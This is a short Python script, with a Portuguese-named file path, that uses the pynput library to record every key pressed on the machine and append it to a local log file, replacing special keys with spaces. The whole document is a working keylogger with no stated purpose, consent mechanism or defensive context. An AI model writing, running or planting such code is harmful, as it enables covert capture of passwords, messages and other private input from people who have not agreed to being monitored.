from pynput import keyboard
import re

filelog = "C:/Users/Júlio César/Documents/Projects/Ferramentas/log2.txt"

def x(k):
    k = str(k)
    k =re.sub(r'\'', '', k)
    k = re.sub(r'Key.Delete', ' ', k)
    k =re.sub(r'Key.space', ' ', k)
    k = re.sub(r'Key.backspace', ' ', k)
    k = re.sub(r'Key.enter', ' ', k)
    k = re.sub(r'Key.tab', ' ', k)
    
    with open(filelog, "a") as arquivo:
        arquivo.write(k)

with keyboard.Listener(on_press=x) as l:
    l.join()